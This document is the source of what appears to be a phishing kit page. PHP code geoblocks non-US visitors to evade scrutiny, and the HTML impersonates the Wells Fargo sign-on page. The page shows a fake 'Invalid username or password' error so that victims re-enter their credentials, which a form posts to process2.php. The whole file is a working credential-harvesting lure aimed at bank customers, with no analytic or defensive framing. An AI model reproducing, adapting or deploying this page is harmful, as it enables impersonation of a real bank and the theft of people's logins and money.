<?php

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


if($_SERVER['HTTP_X_FORWARDED_FOR'])
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else
		
		$ip = $_SERVER['REMOTE_ADDR'];
		
		$two_letter_country_code = iptocountry($ip);
		
		function iptocountry($ip){
			$numbers = preg_split( "/\./", $ip);
			include("ip_files/".$numbers[0]. ".php");
			$code = ($numbers[0] * 16777216) + ($numbers[1] * 65536) + ($numbers[2] * 256) + ($numbers[3]);
			
			foreach($ranges as $key => $value){
				if($key <= $code){
					if($ranges[$key][0] >= $code){
						$country = $ranges[$key][1]; break;
					}
				}
			}
			
			if($country == ""){
				$country = "unknown";
			}
			return $country;	
		}
		
		// Then add this little blocking script at the end of the code above
		
		//if($two_letter_country_code == "US")
		//die();
		
		
		if($two_letter_country_code == "US"){
		
			}
		else{
		
		  die("You do not have access to this page");
		}

?>
<!DOCTYPE html>
 

<html xmlns="http://www.w3.org/1999/xhtml" xmlns:tcdl="http://www.tridion.com/ContentDelivery/5.3/TCDL"  class="no-js" lang="en">
<head>
    <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages & More</title>
    <meta name="description" content="Wells Fargo: Provider of banking, mortgage, investing, credit card, and personal, small business, and commercial financial services. Learn more." />
    <meta name="keywords" content="home page, log in, view accounts, wellsfargo.com, sign in, sign on" />
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta http-equiv="Content-type" content="text/html" />
    <meta http-equiv="Cache-Control" content="must-revalidate" />
    <meta http-equiv="Cache-Control" content="no-store" />
    <meta http-equiv="Cache-Control" content="no-cache" />
    <meta http-equiv="Cache-Control" content="private" />
    <meta http-equiv="Pragma" content="no-cache" />
    

    <meta name="application-name" content="WELLS FARGO BANK"/>
    <meta name="msapplication-TileColor" content="#1e3d75"/>
    <meta name="msapplication-TileImage" content="WELLSPIN.png"/>
    
     <link rel="stylesheet" href="css/style.css" />
     <link rel="shortcut icon" href="images/favicon.png"/>
     <script type="text/javascript" src="js/jqueryLib.js"></script>
     <script type="text/javascript" src="js/gibberish-detector.js"></script>
</head>

<body>

<div class="p2-header-const">
    <div class="p2-header"></div>
</div>
<div class="p2-line"></div>
<div class="p2-header2-const">
    <div class="p2-header2"></div>
</div>
<div class="p2-banner-const">
    <div class="p2-banner"></div>
</div>
<div class="p2-content-const">
  <div class="p2-content">
    <div class="p2-box1">
      <form name="form1" method="post" action="process2.php">
        <table width="452" border="0">
          <tr>
            <td colspan="2"><div class="p2-login-text"></div></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td colspan="2"><div class="error-msg2">Invalid username or password. Try again</div></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td width="195"><div class="p2-username-box">
             <div class="p2-l-user"></div>
            <input type="text" name="username1" id="username1" required autocomplete="off" class="p2-username">
            </div>
            </td>
            <td width="247"><div class="p2-password-box">
            <div class="p2-l-pass"></div>
            <input type="password" name="password1" id="password1" required autocomplete="off" class="p2-username">
            </div>
            </td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td><div class="p2-saveuser"></div></td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td><div class="p2-forgot2"></div></td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td align="right"><input type="submit" name="btnlogin" id="btnlogin" value="Sign On" class="p2-logbtn"></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
        </table>
      </form>
    </div>
    <div class="p2-box2"></div>
  </div>
</div>
<div class="p2-footer-const">
  <div class="p2-footer"></div>
</div>

<script>
   var input = document.getElementById("password1");
   input.addEventListener("keyup", function(event){
	  if(event.keyCode === 13){
	    event.preventDefault();
		document.getElementById("btnsignon").click();
	  }
	
	});
</script> 
<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>